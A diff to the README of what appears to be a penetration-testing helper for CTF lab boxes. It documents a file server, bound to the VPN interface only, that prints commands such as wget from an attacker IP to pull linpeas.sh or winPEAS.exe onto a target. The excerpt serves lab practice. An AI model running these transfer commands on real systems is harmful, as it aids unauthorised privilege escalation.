@@ -158,7 +158,7 @@ It prints what to type on the target, with your `$ATTACKER_IP`, then starts the 
 | HTTP | `wget http://10.10.14.7/linpeas.sh -O /tmp/linpeas.sh` | `iwr http://10.10.14.7/winPEAS.exe -OutFile ...` |
 | SMB | | `copy \\10.10.14.7\share\winPEAS.exe .` |
 
-Needs `python3`, and `impacket-smbserver` for SMB. If your VPN interface is down it tells you, instead of printing a wrong IP.
+It listens on your VPN IP only, not on your other interfaces, so nobody on your LAN can read the folder. `dz serve exploits` serves a subfolder of the loaded box. A folder with box files in it (`creds`, `.dropzone`, `notes.md`) and your home folder are refused. If your VPN interface is down it tells you, instead of printing a wrong IP. Needs `python3`, and `impacket-smbserver` for SMB.
 
 ## Copy to the clipboard
 
